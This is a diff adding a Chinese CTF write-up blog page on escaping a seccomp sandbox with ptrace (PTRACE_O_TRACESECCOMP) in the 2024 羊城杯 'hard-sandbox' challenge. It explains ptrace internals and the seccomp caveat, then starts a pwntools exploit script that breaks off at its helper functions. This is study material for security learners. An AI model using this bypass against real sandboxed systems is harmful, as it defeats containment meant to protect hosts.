@@ -1,0 +1,361 @@
+<!doctype html><html lang=zh-CN data-theme=light><head><meta charset=UTF-8><meta name=viewport content="width=device-width"><meta name=theme-color content="#222" media="(prefers-color-scheme: light)"><meta name=generator content="Hugo 0.126.1"><link rel="shortcut icon" type=image/x-icon href=/imgs/icons/favicon.ico><link rel=icon type=image/x-icon href=/imgs/icons/favicon.ico><link rel=icon type=image/png sizes=16x16 href=/imgs/icons/favicon_16x16_next.png><link rel=icon type=image/png sizes=32x32 href=/imgs/icons/favicon_32_32_next.png><link rel=apple-touch-icon sizes=180x180 href=/imgs/icons/apple_touch_icon_next.png><meta itemprop=name content="基于ptrace的沙箱绕过"><meta itemprop=description content="集中一点,登峰造极"><meta name=description content="集中一点,登峰造极"><meta itemprop=datePublished zgotmplz><meta itemprop=dateModified zgotmplz><meta itemprop=image content="https://zp9080.github.io/imgs/author.png"><meta itemprop=keywords content="ptrace"><meta property="og:type" content="article"><meta property="og:title" content="基于ptrace的沙箱绕过"><meta property="og:description" content="集中一点,登峰造极"><meta property="og:image" content="/imgs/author.png"><meta property="og:image:width" content="312"><meta property="og:image:height" content="312"><meta property="og:image:type" content="image/jpeg/png/svg/jpg"><meta property="og:url" content="https://zp9080.github.io/post/shellcode/%E5%9F%BA%E4%BA%8Eptrace%E7%9A%84%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87/"><meta property="og:site_name" content="f1ow-blog"><meta property="og:locale" content="zh-CN"><meta property="article:author" content="f1ow"><meta property="article:published_time" content="2024-09-03 14:31:33 +0800 CST"><meta property="article:modified_time" content="2024-09-03 14:31:33 +0800 CST"><link type=text/css rel=stylesheet href=https://zp9080.github.io/3rd/font-awesome/6.6.0/css/all.min.css><link type=text/css rel=stylesheet href=https://zp9080.github.io/3rd/animate.css/4.1.1/animate.min.css><link type=text/css rel=stylesheet href=https://zp9080.github.io/3rd/viewerjs/1.11.6/viewer.min.css><link rel=stylesheet href=/css/main.min.bfbac3431de920c11b5b1cafa45029ea1bc93d5d3da50fed4ab6924b4c250360.css><script type=text/javascript>(function(){localDB={set:function(e,t,n){if(n===0)return;const s=new Date,o=n*864e5,i={value:t,expiry:s.getTime()+o};localStorage.setItem(e,JSON.stringify(i))},get:function(e){const t=localStorage.getItem(e);if(!t)return void 0;const n=JSON.parse(t),s=new Date;return s.getTime()>n.expiry?(localStorage.removeItem(e),void 0):n.value}},theme={active:function(){const e=localDB.get("theme");if(e==null)return;theme.toggle(e),window.matchMedia("(prefers-color-scheme: dark)").addListener(function(e){theme.toggle(e.matches?"dark":"light")})},toggle:function(e){document.documentElement.setAttribute("data-theme",e),localDB.set("theme",e,2);const t=document.querySelector("iframe.giscus-frame");if(t){const n={setConfig:{theme:e}};t.contentWindow.postMessage({giscus:n},"https://giscus.app")}}},theme.active()})(window)</script><script class=next-config data-name=page type=application/json>{"comments":false,"isHome":false,"isPage":true,"path":"%E5%9F%BA%E4%BA%8Eptrace%E7%9A%84%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87","permalink":"https://zp9080.github.io/post/shellcode/%E5%9F%BA%E4%BA%8Eptrace%E7%9A%84%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87/","title":"基于ptrace的沙箱绕过","waline":{"js":[{"alias":"@waline/client","alias_name":"waline","file":"dist/pageview.js","name":"pageview","version":"2.15.8"},{"alias":"@waline/client","alias_name":"waline","file":"dist/comment.js","name":"comment","version":"2.15.8"}]}}</script><script type=text/javascript>document.addEventListener("DOMContentLoaded",()=>{var e=document.createElement("script");e.charset="UTF-8",e.src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js",e.async=!1,e.defer=!0,document.head.appendChild(e),e.onload=function(){NexT.utils.fmtBusuanzi()}})</script><title>基于ptrace的沙箱绕过 - f1ow-blog</title><noscript><link rel=stylesheet href=/css/noscript.css></noscript></head><body itemscope itemtype=http://schema.org/WebPage class=use-motion><div class=headband></div><div class=overlay></div><main class=main><header class=header itemscope itemtype=http://schema.org/WPHeader><div class=header-inner><div class=site-brand-container><div class=site-nav-toggle><div class=toggle aria-label role=button><span class=toggle-line></span>
+<span class=toggle-line></span>
+<span class=toggle-line></span></div></div><div class=site-meta><a href=/ class=brand rel=start><i class=logo-line></i><h1 class=site-title>f1ow-blog</h1><i class=logo-line></i></a><p class=site-subtitle itemprop=description>集中一点,登峰造极</p></div><div class=site-nav-right><div class="toggle popup-trigger"><i class="fa fa-search fa-fw fa-lg"></i></div></div></div><nav class=site-nav><ul class="main-menu menu"><li class="menu-item menu-item-home"><a href=/ class=hvr-icon-pulse rel=section><i class="fa fa-home hvr-icon"></i>首页</a></li><li class="menu-item menu-item-about"><a href=/about/ class=hvr-icon-pulse rel=section><i class="fa fa-user hvr-icon"></i>关于</a></li><li class="menu-item menu-item-archives"><a href=/ class=hvr-icon-pulse rel=section><i class="fa fa-archive hvr-icon"></i>归档
+<span class=badge>207</span></a></li><li class="menu-item menu-item-categories"><a href=/categories/ class=hvr-icon-pulse rel=section><i class="fa fa-categories hvr-icon"></i>分类</a></li><li class="menu-item menu-item-tags"><a href=/tags/ class=hvr-icon-pulse rel=section><i class="fa fa-tags hvr-icon"></i>标签</a></li><li class="menu-item menu-item-search"><a role=button class="popup-trigger hvr-icon-pulse"><i class="fa fa-search fa-fw hvr-icon"></i>搜索</a></li></ul></nav><div class=search-pop-overlay><div class="popup search-popup"><div class=search-header><span class=search-icon><i class="fa fa-search"></i></span><div class=search-input-container><input autocomplete=off autocapitalize=off maxlength=80 placeholder=搜索... spellcheck=false type=search class=search-input></div><span class=popup-btn-close role=button><i class="fa fa-times-circle"></i></span></div><div class="search-result-container no-result"><div class=search-result-icon><i class="fa fa-spinner fa-pulse fa-5x"></i></div></div></div></div></div><div class="toggle sidebar-toggle" role=button><span class=toggle-line></span>
+<span class=toggle-line></span>
+<span class=toggle-line></span></div><aside class=sidebar><div class="sidebar-inner sidebar-nav-active sidebar-toc-active"><ul class=sidebar-nav><li class=sidebar-nav-toc>文章目录</li><li class=sidebar-nav-overview>站点概览</li></ul><div class=sidebar-panel-container><div class="post-toc-wrap sidebar-panel"><div class="post-toc animated"><nav id=TableOfContents><ul><li><a href=#前言>前言</a></li><li><a href=#ptrace学习>ptrace学习</a></li><li><a href=#再次解题>再次解题</a></li><li><a href=#后记>后记</a></li></ul></nav></div></div><div class="site-overview-wrap sidebar-panel"><div class="site-author site-overview-item animated" itemprop=author itemscope itemtype=http://schema.org/Person><img class=site-author-image itemprop=image alt=f1ow src=/imgs/img-lazy-loading.gif data-src=/imgs/author.png><p class=site-author-name itemprop=name>f1ow</p><div class=site-description itemprop=description>集中一点,登峰造极</div></div><div class="site-state-wrap site-overview-item animated"><nav class=site-state><div class="site-state-item site-state-posts"><a href=/archives/><span class=site-state-item-count>207</span>
+<span class=site-state-item-name>日志</span></a></div><div class="site-state-item site-state-categories"><a href=/categories/><span class=site-state-item-count>38</span>
+<span class=site-state-item-name>分类</span></a></div><div class="site-state-item site-state-tags"><a href=/tags/><span class=site-state-item-count>80</span>
+<span class=site-state-item-name>标签</span></a></div></nav></div><div class="links-of-social site-overview-item animated"><span class=links-of-social-item><a href=https://github.com/zp9080 title="Github → https://github.com/zp9080" rel=noopener class=hvr-icon-pulse target=_blank><i class="fab fa-github fa-fw hvr-icon"></i>
+Github</a></span></div><div class="cc-license animated" itemprop=license><a href=https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh class=cc-opacity rel=noopener target=_blank title=共享知识><img src=/imgs/img-lazy-loading.gif data-src=/imgs/cc/big/by_nc_sa.svg alt=共享知识></a></div><div class="links-of-blogroll site-overview-item animated"><div class=links-of-blogroll-title><i class="fa fa-globe fa-fw"></i>
+友情链接</div><ul class=links-of-blogroll-list><li class=links-of-blogroll-item><a href=https://v3rdant.cn/ title=https://v3rdant.cn/ target=_blank>v3rdant</a></li><li class=links-of-blogroll-item><a href=https://juicymio.github.io/ title=https://juicymio.github.io/ target=_blank>juicymio</a></li><li class=links-of-blogroll-item><a href=https://ka7arotto.github.io/ title=https://ka7arotto.github.io/ target=_blank>Goku</a></li></ul></div></div></div></div><div id=siteinfo-card-widget class=sidebar-card-widget><div class=item-headline><i class="fas fa-chart-line"></i>
+<span>网站资讯</span></div><div class=siteinfo><div class=siteinfo-item><div class=item-name><i class="fa-solid fa-calendar-check"></i>已运行：</div><div class=item-count id=runTimes data-publishdate=2024-07-28T00:00:00+00:00></div></div><div class=siteinfo-item><div class=item-name><i class="fas fa fa-user"></i>总访客数：</div><div class=item-count id=busuanzi_value_site_uv><i class="fa fa-sync fa-spin"></i></div></div><div class=siteinfo-item><div class=item-name><i class="fas fa fa-eye"></i>页面浏览：</div><div class=item-count id=busuanzi_value_site_pv><i class="fa fa-sync fa-spin"></i></div></div><div class=siteinfo-item><div class=item-name><i class="fa fa-font"></i>总字数：</div><div class=item-count id=wordsCount data-count=273686></div></div><div class=siteinfo-item><div class=item-name><i class="fa fa-mug-hot"></i>阅读约：</div><div class=item-count id=readTimes data-times=660></div></div><div class=siteinfo-item><div class=item-name><i class="fa fa-clock-rotate-left"></i>最后更新于：</div><div class=item-count id=last-push-date data-lastpushdate=2025-02-27T17:57:37+08:00></div></div></div></div></aside><div class=sidebar-dimmer></div></header><div class=tool-buttons><div id=toggle-theme class=button title=深浅模式切换><i class="fas fa-adjust"></i></div><div class=back-to-top role=button title=返回顶部><i class="fa fa-arrow-up"></i>
+<span>0%</span></div></div><div class=reading-progress-bar></div><a role=button class="book-mark-link book-mark-link-fixed"></a><a href=https://github.com/zp9080 rel="noopener external nofollow noreferrer" target=_blank title="Follow me on GitHub" class="exturl github-corner"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0 0 115 115h15l12 27L250 250V0z"/><path d="M128.3 109C113.8 99.7 119 89.6 119 89.6 122 82.7 120.5 78.6 120.5 78.6 119.2 72 123.4 76.3 123.4 76.3 127.3 80.9 125.5 87.3 125.5 87.3 122.9 97.6 130.6 101.9 134.4 103.2" fill="currentcolor" style="transform-origin:130px 106px" class="octo-arm"/><path d="M115 115C114.9 115.1 118.7 116.5 119.8 115.4l13.9-13.8C136.9 99.2 139.9 98.4 142.2 98.6 133.8 88 127.5 74.4 143.8 58 148.5 53.4 154 51.2 159.7 51 160.3 49.4 163.2 43.6 171.4 40.1 171.4 40.1 176.1 42.5 178.8 56.2 183.1 58.6 187.2 61.8 190.9 65.4 194.5 69 197.7 73.2 200.1 77.6 213.8 80.2 216.3 84.9 216.3 84.9 212.7 93.1 206.9 96 205.4 96.6 205.1 102.4 203 107.8 198.3 112.5 181.9 128.9 168.3 122.5 157.7 114.1 157.9 116.9 156.7 120.9 152.7 124.9L141 136.5C139.8 137.7 141.6 141.9 141.8 141.8z" fill="currentcolor" class="octo-body"/></svg>
+</a><script type=text/javascript src=//sidecar.gitter.im/dist/sidecar.v1.js async></script><script type=text/javascript>((window.gitter={}).chat={}).options={room:"hugo-next/community"}</script><noscript><div class=noscript-warning>Theme NexT works best with JavaScript enabled</div></noscript><div class="main-inner post posts-expand"><div class=post-block><article itemscope itemtype=http://schema.org/Article class=post-content lang><link itemprop=mainEntityOfPage href=https://zp9080.github.io/post/shellcode/%E5%9F%BA%E4%BA%8Eptrace%E7%9A%84%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87/><span hidden itemprop=author itemscope itemtype=http://schema.org/Person><meta itemprop=image content="/imgs/author.png"><meta itemprop=name content="f1ow"></span><span hidden itemprop=publisher itemscope itemtype=http://schema.org/Organization><meta itemprop=name content="f1ow"><meta itemprop=description content="集中一点,登峰造极"></span><span hidden itemprop=post itemscope itemtype=http://schema.org/CreativeWork><meta itemprop=name content="基于ptrace的沙箱绕过"><meta itemprop=description content></span><header class=post-header><h1 class=post-title itemprop="name headline">基于ptrace的沙箱绕过
+<a href=https://github.com/user-name/repo-name/tree/branch-name/subdirectory-name/post/Shellcode/%e5%9f%ba%e4%ba%8eptrace%e7%9a%84%e6%b2%99%e7%ae%b1%e7%bb%95%e8%bf%87.md rel="noopener external nofollow noreferrer" target=_blank class="exturl post-edit-link" title=编辑><i class="fa fa-pen-nib"></i></a></h1><div class=post-meta-container><div class=post-meta-items><span class=post-meta-item><span class=post-meta-item-icon><i class="fas fa-solid fa-calendar"></i>
+</span><span class=post-meta-item-text title=发表于>发表于：
+</span><time title="创建时间：2024-09-03 14:31:33 +0800 CST" itemprop="dateCreated datePublished" datetime="2024-09-03 14:31:33 +0800 CST">2024-09-03
+</time></span><span class=post-meta-item><span class=post-meta-item-icon><i class="fas fa-solid fa-folder-open"></i>
+</span><span class=post-meta-item-text title=分类于>分类于：
+</span><span itemprop=about itemscope itemtype=http://schema.org/Thing><a href=/categories/shellcode itemprop=url rel=index><span itemprop=name>PWN/Shellcode</span></a></span></span></div><div class=post-meta-items><span class=post-meta-item title=字数><span class=post-meta-item-icon><i class="fas fa-solid fa-file-word"></i>
+</span><span class=post-meta-item-text>字数：</span>
+<span>3134</span>
+</span><span class=post-meta-item title=阅读><span class=post-meta-item-icon><i class="fas fa-solid fa-clock"></i>
+</span><span class=post-meta-item-text>阅读：&ap;</span>
+<span>7分钟</span>
+</span><span class=post-meta-item title=浏览><span class=post-meta-item-icon><i class="fas fa-solid fa-eye"></i>
+</span><span class=post-meta-item-text>浏览：
+</span><span id=busuanzi_value_page_pv data-path=/post/shellcode/%E5%9F%BA%E4%BA%8Eptrace%E7%9A%84%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87/><i class="fa fa-sync fa-spin"></i></span></span></div></div></header><div class="post-body autonumber" itemprop=articleBody><h1 id=前言>前言
+<a class=header-anchor href=#%e5%89%8d%e8%a8%80></a></h1><ul><li>打2024羊城杯遇到一个hard-sandbox题目，禁用了open,openat,也不让用32系统调用(retfq也无法使用)，于是就卡住做不出来了，赛后一段时间想起来这个题在网上搜了一下看有的师傅说可以用ptrace绕过沙箱来拿到flag，于是有了这篇文章</li></ul><h1 id=ptrace学习>ptrace学习
+<a class=header-anchor href=#ptrace%e5%ad%a6%e4%b9%a0></a></h1><ul><li><a href=https://www.anquanke.com/post/id/231078#h2-1 title=主要是参考了这篇文章 rel="noopener external nofollow noreferrer" target=_blank class=exturl>主要是参考了这篇文章
+<i class="fa fa-external-link-alt"></i>
+</a>，这篇文章ptrace讲的很细，但重点是在逆向如何绕过ptrace进行调试，而不是笔者的目的绕过沙箱。网上讲ptrace文章也不少，但是大多数是讲原理。</li><li>这里记录一下学习ptrace原理的一些重点</li></ul><p>ptrace 可以让父进程控制子进程运行，ptrace主要跟踪的是进程运行时的状态，直到收到一个终止信号结束进程，这里的信号如果是我们给程序设置的断点，则进程被中止，并且通知其父进程，在进程中止的状态下，进程的内存空间可以被读写。当然父进程还可以使子进程继续执行，并选择是否忽略引起中止的信号，ptrace可以让一个进程监视和控制另一个进程的执行,并且修改被监视进程的内存、寄存器等,主要应用于断点调试和系统调用跟踪</p><p>strace和gdb工具就是基于ptrace编写的!!!</p><p>ptrace函数的定义</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:1;-o-tab-size:1;tab-size:1><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#080>#include</span> <span style=color:#080>&lt;sys/ptrace.h&gt;       </span><span style=color:#080>
+</span></span></span><span style=display:flex><span><span style=color:#080></span><span style=color:#0b0;font-weight:700>long</span> <span style=color:#00a000>ptrace</span>(<span style=color:#a2f;font-weight:700>enum</span> __ptrace_request request, <span style=color:#0b0;font-weight:700>pid_t</span> pid, <span style=color:#0b0;font-weight:700>void</span> <span style=color:#666>*</span>addr, <span style=color:#0b0;font-weight:700>void</span> <span style=color:#666>*</span>data);
+</span></span></code></pre></div><p>一共有四个参数：
+request: 表示要执行的操作类型。
+pid: 要操作的目标进程ID
+addr: 要监控的目标内存地址
+data: 保存读取出或者要写入的数据 详情请参看man手册
+<a href=https://man7.org/linux/man-pages/man2/ptrace.2.html title=https://man7.org/linux/man-pages/man2/ptrace.2.html rel="noopener external nofollow noreferrer" target=_blank class=exturl>https://man7.org/linux/man-pages/man2/ptrace.2.html
+<i class="fa fa-external-link-alt"></i></a></p><p>ptrace函数的内核实现：
+ptrace的内核实现在kernel/ptrace.c文件中，直接看内核接口是SYSCALL_DEFINE4(ptrace, long, request, long, pid, unsigned long, addr, unsigned long, data)，代码如下：
+源码链接:
+<a href=https://elixir.bootlin.com/linux/v5.6/source/kernel/ptrace.c title=https://elixir.bootlin.com/linux/v5.6/source/kernel/ptrace.c rel="noopener external nofollow noreferrer" target=_blank class=exturl>https://elixir.bootlin.com/linux/v5.6/source/kernel/ptrace.c
+<i class="fa fa-external-link-alt"></i></a></p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:1;-o-tab-size:1;tab-size:1><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#080>#ifndef arch_ptrace_attach
+</span></span></span><span style=display:flex><span><span style=color:#080>#define arch_ptrace_attach(child)	do { } while (0)
+</span></span></span><span style=display:flex><span><span style=color:#080>#endif
+</span></span></span><span style=display:flex><span><span style=color:#080></span>
+</span></span><span style=display:flex><span><span style=color:#00a000>SYSCALL_DEFINE4</span>(ptrace, <span style=color:#0b0;font-weight:700>long</span>, request, <span style=color:#0b0;font-weight:700>long</span>, pid, <span style=color:#0b0;font-weight:700>unsigned</span> <span style=color:#0b0;font-weight:700>long</span>, addr,
+</span></span><span style=display:flex><span>		<span style=color:#0b0;font-weight:700>unsigned</span> <span style=color:#0b0;font-weight:700>long</span>, data)
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>	<span style=color:#a2f;font-weight:700>struct</span> task_struct <span style=color:#666>*</span>child;
+</span></span><span style=display:flex><span>	<span style=color:#0b0;font-weight:700>long</span> ret;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	<span style=color:#a2f;font-weight:700>if</span> (request <span style=color:#666>==</span> PTRACE_TRACEME) {
+</span></span><span style=display:flex><span>		ret <span style=color:#666>=</span> <span style=color:#00a000>ptrace_traceme</span>();
+</span></span><span style=display:flex><span>		<span style=color:#a2f;font-weight:700>if</span> (<span style=color:#666>!</span>ret)
+</span></span><span style=display:flex><span>			<span style=color:#00a000>arch_ptrace_attach</span>(current);
+</span></span><span style=display:flex><span>		<span style=color:#a2f;font-weight:700>goto</span> out;
+</span></span><span style=display:flex><span>	}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	child <span style=color:#666>=</span> <span style=color:#00a000>find_get_task_by_vpid</span>(pid);
+</span></span><span style=display:flex><span>	<span style=color:#a2f;font-weight:700>if</span> (<span style=color:#666>!</span>child) {
+</span></span><span style=display:flex><span>		ret <span style=color:#666>=</span> <span style=color:#666>-</span>ESRCH;
+</span></span><span style=display:flex><span>		<span style=color:#a2f;font-weight:700>goto</span> out;
+</span></span><span style=display:flex><span>	}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	<span style=color:#a2f;font-weight:700>if</span> (request <span style=color:#666>==</span> PTRACE_ATTACH <span style=color:#666>||</span> request <span style=color:#666>==</span> PTRACE_SEIZE) {
+</span></span><span style=display:flex><span>		ret <span style=color:#666>=</span> <span style=color:#00a000>ptrace_attach</span>(child, request, addr, data);
+</span></span><span style=display:flex><span>		<span style=color:#080;font-style:italic>/*
+</span></span></span><span style=display:flex><span><span style=color:#080;font-style:italic>		 * Some architectures need to do book-keeping after
+</span></span></span><span style=display:flex><span><span style=color:#080;font-style:italic>		 * a ptrace attach.
+</span></span></span><span style=display:flex><span><span style=color:#080;font-style:italic>		 */</span>
+</span></span><span style=display:flex><span>		<span style=color:#a2f;font-weight:700>if</span> (<span style=color:#666>!</span>ret)
+</span></span><span style=display:flex><span>			<span style=color:#00a000>arch_ptrace_attach</span>(child);
+</span></span><span style=display:flex><span>		<span style=color:#a2f;font-weight:700>goto</span> out_put_task_struct;
+</span></span><span style=display:flex><span>	}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	ret <span style=color:#666>=</span> <span style=color:#00a000>ptrace_check_attach</span>(child, request <span style=color:#666>==</span> PTRACE_KILL <span style=color:#666>||</span>
+</span></span><span style=display:flex><span>				  request <span style=color:#666>==</span> PTRACE_INTERRUPT);
+</span></span><span style=display:flex><span>	<span style=color:#a2f;font-weight:700>if</span> (ret <span style=color:#666>&lt;</span> <span style=color:#666>0</span>)
+</span></span><span style=display:flex><span>		<span style=color:#a2f;font-weight:700>goto</span> out_put_task_struct;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	ret <span style=color:#666>=</span> <span style=color:#00a000>arch_ptrace</span>(child, request, addr, data);
+</span></span><span style=display:flex><span>	<span style=color:#a2f;font-weight:700>if</span> (ret <span style=color:#666>||</span> request <span style=color:#666>!=</span> PTRACE_DETACH)
+</span></span><span style=display:flex><span>		<span style=color:#00a000>ptrace_unfreeze_traced</span>(child);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span> <span style=color:#a0a000>out_put_task_struct</span>:
+</span></span><span style=display:flex><span>	<span style=color:#00a000>put_task_struct</span>(child);
+</span></span><span style=display:flex><span> <span style=color:#a0a000>out</span>:
+</span></span><span style=display:flex><span>	<span style=color:#a2f;font-weight:700>return</span> ret;
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>在使用ptrace之前需要在两个进程间建立追踪关系，其中tracee可以不做任何事，也可使用prctl和PTRACE_TRACEME来进行设置，ptrace编程的主要部分是tracer，它可以通过附着的方式与tracee建立追踪关系，建立之后，可以控制tracee在特定的时候暂停并向tracer发送相应信号，而tracer则通过循环等待waitpid来处理tracee发来的信号</p><p>建立追踪关系
+在进行追踪前需要先建立追踪关系，相关request有如下4个：
+PTRACE_TRACEME：tracee表明自己想要被追踪，这会自动与父进程建立追踪关系，这也是唯一能被tracee使用的request，其他的request都由tracer指定。
+PTRACE_ATTACH：tracer用来附着一个进程tracee，以建立追踪关系，并向其发送SIGSTOP信号使其暂停。
+PTRACE_SEIZE：像PTRACE_ATTACH附着进程，但它不会让tracee暂停，addr参数须为0，data参数指定一位ptrace选项。
+PTRACE_DETACH：解除追踪关系，tracee将继续运行。</p><p>需要知道request几个参数：</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:1;-o-tab-size:1;tab-size:1><code class=language-text data-lang=text><span style=display:flex><span>PTRACE_POKETEXT, PTRACE_POKEDATA:往内存地址中写入一个字节。内存地址由addr给出。
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>PTRACE_PEEKTEXT, PTRACE_PEEKDATA:从内存地址中读取一个字节，内存地址由addr给出
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>PTRACE_ATTACH:跟踪指定pid 进程
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>PTRACE_GETREGS:读取所有寄存器的值
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>PTRACE_CONT:继续执行示被跟踪的子进程，signal为0则忽略引起调试进程中止的信号，若不为0则继续处理信号signal。
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>PTRACE_SETREGS:设置寄存器
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>PTRACE_DETACH:结束跟踪
+</span></span></code></pre></div><h1 id=再次解题>再次解题
+<a class=header-anchor href=#%e5%86%8d%e6%ac%a1%e8%a7%a3%e9%a2%98></a></h1><ul><li>上述学习完是明白了ptrace的工作原理，但是好像和sandbox没太多关系，直接看到如下内容,
+<a href=https://www.kernel.org/doc/html/latest/translations/zh_CN/userspace-api/seccomp_filter.html title=内容链接 rel="noopener external nofollow noreferrer" target=_blank class=exturl>内容链接
+<i class="fa fa-external-link-alt"></i></a></li><li><strong>在追踪器被通知后，seccomp检查不会再次运行。（这意味着基于seccomp的沙箱必须禁止 ptrace的使用，甚至其他沙箱进程也不行，除非非常小心；ptrace可以通过这个机制来逃逸。）</strong> 这里的意思就是如果第一次触发了seccomp,那么第二次就不会再次触发seccomp,那么之后的沙盒等于没用了，官方文件也是说明了这个ptrace对seccomp的逃逸 <img src=/imgs/img-lazy-loading.gif data-src=/imgs/photos4/36.png alt="alt text"></li><li>可以看到题目的沙盒确实不是直接kill，而是返回trace。这样就有了利用思路，调用ptrace(PTRACE_SETOPTIONS, pid, 0, PTRACE_0_TRACESECCOMP)然后让子进程拿到flag即可 <img src=/imgs/img-lazy-loading.gif data-src=/imgs/photos4/37.png alt="alt text"></li><li>exp</li></ul><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:1;-o-tab-size:1;tab-size:1><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#a2f;font-weight:700>from</span> <span style=color:#00f;font-weight:700>pwn</span> <span style=color:#a2f;font-weight:700>import</span> <span style=color:#666>*</span>
+</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>from</span> <span style=color:#00f;font-weight:700>pwnlib.util.packing</span> <span style=color:#a2f;font-weight:700>import</span> u64
+</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>from</span> <span style=color:#00f;font-weight:700>pwnlib.util.packing</span> <span style=color:#a2f;font-weight:700>import</span> u32
+</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>from</span> <span style=color:#00f;font-weight:700>pwnlib.util.packing</span> <span style=color:#a2f;font-weight:700>import</span> u16
+</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>from</span> <span style=color:#00f;font-weight:700>pwnlib.util.packing</span> <span style=color:#a2f;font-weight:700>import</span> u8
+</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>from</span> <span style=color:#00f;font-weight:700>pwnlib.util.packing</span> <span style=color:#a2f;font-weight:700>import</span> p64
+</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>from</span> <span style=color:#00f;font-weight:700>pwnlib.util.packing</span> <span style=color:#a2f;font-weight:700>import</span> p32
+</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>from</span> <span style=color:#00f;font-weight:700>pwnlib.util.packing</span> <span style=color:#a2f;font-weight:700>import</span> p16
+</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>from</span> <span style=color:#00f;font-weight:700>pwnlib.util.packing</span> <span style=color:#a2f;font-weight:700>import</span> p8
+</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>from</span> <span style=color:#00f;font-weight:700>pwn</span> <span style=color:#a2f;font-weight:700>import</span> <span style=color:#666>*</span>
+</span></span><span style=display:flex><span>context(os<span style=color:#666>=</span><span style=color:#b44>&#39;linux&#39;</span>, arch<span style=color:#666>=</span><span style=color:#b44>&#39;amd64&#39;</span>, log_level<span style=color:#666>=</span><span style=color:#b44>&#39;debug&#39;</span>)
+</span></span><span style=display:flex><span>p <span style=color:#666>=</span> process(<span style=color:#b44>&#34;/home/zp9080/PWN/pwn&#34;</span>)
+</span></span><span style=display:flex><span><span style=color:#080;font-style:italic># p=remote(&#39;139.155.126.78&#39;,31700)</span>
+</span></span><span style=display:flex><span><span style=color:#080;font-style:italic># p=process([&#39;seccomp-tools&#39;,&#39;dump&#39;,&#39;/home/zp9080/PWN/pwn&#39;])</span>
+</span></span><span style=display:flex><span>elf <span style=color:#666>=</span> ELF(<span style=color:#b44>&#34;/home/zp9080/PWN/pwn&#34;</span>)
+</span></span><span style=display:flex><span>libc<span style=color:#666>=</span>elf<span style=color:#666>.</span>libc
+</span></span><span style=display:flex><span>gdb_script<span style=color:#666>=</span><span style=color:#b44>&#39;&#39;&#39;
+</span></span></span><span style=display:flex><span><span style=color:#b44>&#39;&#39;&#39;</span>
+</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>def</span> <span style=color:#00a000>dbg</span>():
+</span></span><span style=display:flex><span>    gdb<span style=color:#666>.</span>attach(p,gdb_script)  
+</span></span><span style=display:flex><span>    pause()
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#080;font-style:italic># dbg()</span>
+</span></span><span style=display:flex><span>sla <span style=color:#666>=</span> <span style=color:#a2f;font-weight:700>lambda</span> data, content: p<span style=color:#666>.</span>sendlineafter(data, content)
+</span></span><span style=display:flex><span>sa <span style=color:#666>=</span> <span style=color:#a2f;font-weight:700>lambda</span> data, content: p<span style=color:#666>.</span>sendafter(data, content)
+</span></span><span style=display:flex><span>sl <span style=color:#666>=</span> <span style=color:#a2f;font-weight:700>lambda</span> data: p<span style=color:#666>.</span>sendline(data)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#080;font-style:italic># ---------------------------------------------------------</span>
+</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>def</span> <span style=color:#00a000>add</span>(index, size):
+</span></span><span style=display:flex><span>    sla(<span style=color:#b44>&#39;&gt;&#39;</span>, <span style=color:#b44>&#39;1&#39;</span>)
+</span></span><span style=display:flex><span>    sla(<span style=color:#b44>&#39;Index: &#39;</span>, <span style=color:#a2f>str</span>(index))
+</span></span><span style=display:flex><span>    sla(<span style=color:#b44>&#39;: &#39;</span>, <span style=color:#a2f>str</span>(size))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>def</span> <span style=color:#00a000>edit</span>(index, content):
+</span></span><span style=display:flex><span>    sla(<span style=color:#b44>&#39;&gt;&#39;</span>, <span style=color:#b44>&#39;3&#39;</span>)
+</span></span><span style=display:flex><span>    sla(<span style=color:#b44>&#39;Index: &#39;</span>, <span style=color:#a2f>str</span>(index))
+</span></span><span style=display:flex><span>    sa(<span style=color:#b44>&#39;: &#39;</span>, content)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>def</span> <span style=color:#00a000>delete</span>(index):
